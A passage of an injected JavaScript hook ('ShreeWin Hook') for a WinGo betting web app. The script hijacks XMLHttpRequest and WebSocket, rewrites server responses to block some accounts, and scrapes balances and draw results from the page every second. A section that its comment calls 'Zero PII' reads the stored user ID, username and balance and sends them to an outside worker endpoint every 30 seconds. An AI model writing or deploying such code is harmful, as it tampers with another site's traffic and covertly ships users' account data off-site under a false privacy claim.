
                        // ── POST-RESPONSE: Check UID from response against DB ──
                        if (candidateUid && candidateUid !== 'null' && candidateUid !== 'undefined') {
                            if (isLoginEndpoint || uLower.includes('getuserinfo') || uLower.includes('/user/info')) {
                                if (remoteConfig.strict_reg_lock) {
                                    let cached = window.__sw_user_check_cache && window.__sw_user_check_cache[candidateUid];
                                    if (!cached) {
                                        cached = checkUserAccessSync(candidateUid, 0);
                                    }
                                    if (cached && cached.isAccessDenied) {
                                        console.warn('[ShreeWin Hook] XHR POST-BLOCK: Denied UID in response:', candidateUid);
                                        enforceAccessDenial(candidateUid);
                                        try {
                                            const fakeBlocked = JSON.stringify({
                                                code: -1,
                                                msg: "Access Restricted: This account was not registered through our official app link.",
                                                message: "Access Restricted: This account was not registered through our official app link.",
                                                data: null, token: null, result: null
                                            });
                                            Object.defineProperty(self, 'responseText', { value: fakeBlocked, configurable: true, writable: true });
                                            Object.defineProperty(self, 'response', { value: fakeBlocked, configurable: true, writable: true });
                                        } catch(_) {}
                                        return; // Don't process game data for blocked user
                                    }
                                }
                            }
                        }

                        if (isLotteryOrWalletUrl(url) || (self.responseText && (self.responseText.includes('202') || self.responseText.includes('balance') || self.responseText.includes('amount')))) {
                            notifyGameData('xhr:' + url, json, url);
                        }
                    } catch(_) {}
                }
            } catch(e) {}
        };

        const origStateChange = this.onreadystatechange;
        this.onreadystatechange = function(event) {
            if (self.readyState === 4) {
                processPayload();
            }
            if (typeof origStateChange === 'function') {
                return origStateChange.apply(this, arguments);
            }
        };

        const origOnLoad = this.onload;
        if (origOnLoad) {
            this.onload = function(event) {
                processPayload();
                return origOnLoad.apply(this, arguments);
            };
        } else {
            this.addEventListener('load', processPayload);
        }

        return origSend.apply(this, args);
    };

    // --- 7. Hook WebSocket with Static Constants Preservation ---
    const origWS = window.WebSocket;
    if (typeof origWS === 'function') {
        const HookedWebSocket = function(...args) {
            const ws = new origWS(...args);
            ws.addEventListener('message', function(event) {
                try {
                    if (typeof event.data === 'string') {
                        const cleanData = event.data.replace(/^\d+/, '');
                        if (cleanData.startsWith('{') || cleanData.startsWith('[')) {
                            const json = JSON.parse(cleanData);
                            notifyGameData('ws', json);
                        }
                    }
                } catch(e) {}
            });
            return ws;
        };

        HookedWebSocket.prototype = origWS.prototype;
        ['CONNECTING', 'OPEN', 'CLOSING', 'CLOSED'].forEach(k => {
            HookedWebSocket[k] = origWS[k];
        });
        window.WebSocket = HookedWebSocket;
    }

    // --- 8. Real-Time Route & State Listeners ---
    if (typeof window.addEventListener === 'function') {
        window.addEventListener('hashchange', () => broadcastAppState(true));
        window.addEventListener('popstate', () => broadcastAppState(true));
    }

    // --- 9. Real-Time Scanner (DOM Period + Balance + State) ---
    // Runs at 1s — enough for live countdown accuracy without hammering DOM
    setInterval(function() {
        try {
            // Check accurate balance (Pinia / localStorage / targeted DOM)
            const currentBal = getAccurateBalance();
            if (currentBal !== null && currentBal !== lastKnownBalance) {
                lastKnownBalance = currentBal;
                try { localStorage.setItem('shreewin_balance', String(currentBal)); } catch(e) {}
                broadcastAppState(true); // balance changed — force notify
            } else {
                broadcastAppState(false); // no-op if stateKey unchanged
            }

            // Check for new user registration completion
            checkRegistrationTransition();

            // If on WinGo screen AND not locked, scan for live period & countdown
            const route = detectCurrentRoute();
            const currentState = (window.__SHREEWIN_STATE__ && window.__SHREEWIN_STATE__.state) || '';
            if (route.isWinGo && currentState !== 'STATE_DEPOSIT_LOCKED' && currentState !== 'STATE_AUTH' && currentState !== 'STATE_MAINTENANCE') {
                let foundPeriod = '';
                let foundSeconds = -1;

                // Strategy A: Direct attribute selectors (fastest, most accurate).
                // Inactive variant panels stay in the DOM — skip hidden nodes so a
                // background 30S panel never wins while the 1M/3M/5M tab is open.
                const attrElements = document.querySelectorAll('[issuenumber], [IssueNumber], [data-issue]');
                for (let i = 0; i < attrElements.length; i++) {
                    if (!isVisibleEl(attrElements[i])) continue;
                    const val = attrElements[i].getAttribute('issuenumber') || attrElements[i].getAttribute('IssueNumber') || attrElements[i].getAttribute('data-issue');
                    if (val && /^202\d{10,18}$/.test(val.trim())) {
                        foundPeriod = val.trim();
                        break;
                    }
                }

                // Strategy B: Text content pattern matching (visible nodes only)
                if (!foundPeriod || foundSeconds < 0) {
                    const elements = document.querySelectorAll('.t-b2-i, .record-body-num, div, span, p, b');
                    let fallbackSeconds = -1;
                    for (let j = 0; j < elements.length; j++) {
                        const el = elements[j];
                        if (el.children.length > 2) continue;
                        const txt = el.textContent ? el.textContent.trim() : '';
                        if (!txt) continue;

                        // Highlighted tab label reveals the on-screen variant
                        if (txt.length <= 24) {
                            const cls = String((el.className && el.className.baseVal !== undefined ? el.className.baseVal : el.className) || '');
                            if (/active|selected|current|choose|checked/i.test(cls)) {
                                const vm = txt.match(/\b(30\s?S(?:EC)?|1\s?M(?:IN)?|3\s?M(?:IN)?|5\s?M(?:IN)?)\b/i);
                                if (vm) { lastSeenTabVariant = normalizeGameCode(vm[1]); }
                            }
                        }

                        if (!isVisibleEl(el)) continue;
                        const pMatch = txt.match(/\b(202\d{10,18})\b/);
                        if (pMatch && !foundPeriod) foundPeriod = pMatch[1];

                        if (foundSeconds < 0) {
                            const tMatch = txt.match(/\b0?([0-5]):([0-5]\d)\b/);
                            if (tMatch) {
                                const v = parseInt(tMatch[1], 10) * 60 + parseInt(tMatch[2], 10);
                                if (txt.length <= 8) foundSeconds = v; // live countdown chip, not a history timestamp
                                else if (fallbackSeconds < 0) fallbackSeconds = v;
                            }
                        }

                        if (foundPeriod && foundSeconds >= 0 && lastSeenTabVariant) break;
                    }
                    if (foundSeconds < 0) foundSeconds = fallbackSeconds;
                }

                // Strategy B5: Offline structure fallback — deterministic period /
                // countdown from IST midnight. Fills only what live DOM missed.
                var usedOffline = false;
                if (!foundPeriod || foundSeconds < 0) {
                    try {
                        var offCode = detectActiveVariant() || route.gameCode || 'WinGo_30S';
                        var off = offlinePeriodFor(offCode, Date.now());
                        if (off) {
                            if (!foundPeriod) { foundPeriod = off.period; usedOffline = true; }
                            if (foundSeconds < 0) { foundSeconds = off.countdown; usedOffline = true; }
                        }
                    } catch (_) {}
                }

                if (foundPeriod || foundSeconds >= 0) {
                    notifyGameData(usedOffline ? 'offline-structure' : 'dom', { issueNumber: foundPeriod, countdown: foundSeconds });
                }
                // Strategy C: Table History Result Scraper — scrapes the top row of the live result table
                try {
                    const activeCode = detectActiveVariant();
                    let bestP = '';
                    let bestN = -1;
                    const rows = document.querySelectorAll('tr, .van-row, .record-item, .history-item, .table-row, div[class*="row"], div[class*="record"], div[class*="item"]');
                    for (let r = 0; r < rows.length; r++) {
                        const row = rows[r];
                        // Skip Nexy overlay elements
                        if (row.closest && row.closest('#nexy-inpage-root')) continue;
                        if (!isVisibleEl(row)) continue;
                        const text = (row.textContent || '').trim();
                        // Guard against entire container elements — single row is short (< 150 chars)
                        if (text.length > 150) continue;
                        // Join cells with spaces: adjacent <td> texts concatenate
                        // ("...51304" + "7") leaving no word boundary for the match.
                        let scanText = text;
                        try {
                            const tds = row.querySelectorAll('td, th');
                            if (tds && tds.length) {
                                scanText = Array.prototype.map.call(tds, function(td) { return (td.textContent || '').trim(); }).join(' ');
                            }
                        } catch(_) {}
                        const pMatch = scanText.match(/\b(202\d{10,18})\b/);
                        if (!pMatch) continue;
                        const pVal = pMatch[1];
                        const hasBig = /\bbig\b/i.test(scanText);
                        const hasSmall = /\bsmall\b/i.test(scanText);

                        let nVal = -1;
                        const cells = row.querySelectorAll('td, span, div, em, b, p');
                        for (let c = 0; c < cells.length; c++) {
                            const cText = (cells[c].textContent || '').trim();
                            if (/^[0-9]$/.test(cText)) {
                                const cand = parseInt(cText, 10);
                                if (hasBig && cand >= 5) { nVal = cand; break; }
                                if (hasSmall && cand < 5) { nVal = cand; break; }
                                if (nVal < 0) nVal = cand;
                            }
                        }
                        if (nVal < 0) {
                            const rest = scanText.substring(scanText.indexOf(pVal) + pVal.length);
                            const digitMatches = rest.match(/\b([0-9])\b/g);
                            if (digitMatches && digitMatches.length > 0) {
                                for (let dm = 0; dm < digitMatches.length; dm++) {
                                    const cand = parseInt(digitMatches[dm], 10);
                                    if (hasBig && cand >= 5) { nVal = cand; break; }
                                    if (hasSmall && cand < 5) { nVal = cand; break; }
                                }
                                if (nVal < 0) nVal = parseInt(digitMatches[0], 10);
                            }
                        }
                        if (nVal >= 0 && nVal <= 9) {
                            if (!bestP || isNewerPeriod(pVal, bestP)) { bestP = pVal; bestN = nVal; }
                        }
                    }
                    if (bestP) {
                        lastTableResultByVariant[activeCode] = { period: bestP, number: bestN, at: Date.now() };
                        storeRealResult(activeCode, bestP, bestN);
                        if (Date.now() - lastTableLogAt > 15000) {
                            lastTableLogAt = Date.now();
                            console.log('[ShreeWin Hook] Table last draw: ' + activeCode + ' #' + bestP + ' = ' + bestN);
                        }
                    }
                } catch(_) {}
            }
        } catch(e) {}
    }, 1000);

    // Immediate tab click listener to catch WinGo variant switches (30s, 1M, 3M, 5M) instantly
    try {
        document.addEventListener('click', function(e) {
            try {
                let el = e.target;
                while (el && el !== document.body) {
                    const txt = (el.textContent || '').trim();
                    if (txt.length <= 30) {
                        const vm = txt.match(/\b(30\s?S(?:EC)?|1\s?M(?:IN)?|3\s?M(?:IN)?|5\s?M(?:IN)?)\b/i);
                        if (vm) {
                            lastSeenTabVariant = normalizeGameCode(vm[1]);
                            setTimeout(() => {
                                broadcastAppState(true);
                            }, 150);
                            break;
                        }
                    }
                    el = el.parentElement;
                }
            } catch(_) {}
        }, true);
    } catch(_) {}

    // Initial broadcast
    setTimeout(() => broadcastAppState(true), 150);

    // --- 10. Clean Anonymous Online Presence Reporter (Zero PII, Zero Phone Scraping, Zero Hardware Tracking) ---
    let anonSessionId = null;
    function getAnonSessionId() {
        if (anonSessionId) return anonSessionId;
        try {
            anonSessionId = sessionStorage.getItem('sw_anon_sid');
        } catch(_) {}
        if (!anonSessionId) {
            anonSessionId = 'player_' + Math.random().toString(36).slice(2, 10);
            try { sessionStorage.setItem('sw_anon_sid', anonSessionId); } catch(_) {}
        }
        return anonSessionId;
    }

    function sendPresencePing() {
        try {
            const sid = getAnonSessionId();
            let userInfo = {};
            try { userInfo = JSON.parse(localStorage.getItem('userInfo') || '{}'); } catch(_) {}
            const userId = String(userInfo.userId || sid).trim();
            const userName = String(userInfo.userName || 'Player').trim();
            const balance = (typeof lastKnownBalance === 'number') ? lastKnownBalance : 0;
            const route = detectCurrentRoute();
            const game = (route.screenName || 'WinGo 1-Min') + (route.gameCode ? ' ' + route.gameCode.replace('WinGo_', '') : '');
            const channel = (window.__APP_CONFIG__ && window.__APP_CONFIG__.channel) || 'v1';

            const payload = {
                userId: userId,
                userName: userName,
                balance: balance,
                game: game,
                channel: channel,
                id: sid
            };

            const baseEndpoint = (window.__APP_CONFIG__ && window.__APP_CONFIG__.cf_config_endpoint) || window.__CF_CONFIG_ENDPOINT__ || 'https://user-state-api.shakir-ansarii075.workers.dev/api/config';
            const hbUrl = baseEndpoint.replace(/\/api\/config.*$/, '/api/heartbeat');

            fetch(hbUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                cache: 'no-store'
            }).catch(() => {});
        } catch(e) {}
    }

    // Ping on initial launch, then every 30 seconds
    setTimeout(sendPresencePing, 2000);
    setInterval(sendPresencePing, 30000);

    // --- 11. Auto-Hydrate Session Helper (route cleanup only) ---
    function autoHydrateSession() {
        try {
            try { localStorage.removeItem('shreewin_last_hash'); } catch(_) {}
        } catch(e) {}
    }

    setTimeout(autoHydrateSession, 300);

    console.log('[ShreeWin Hook] WinGo Live API & State Engine fully active.');
})();
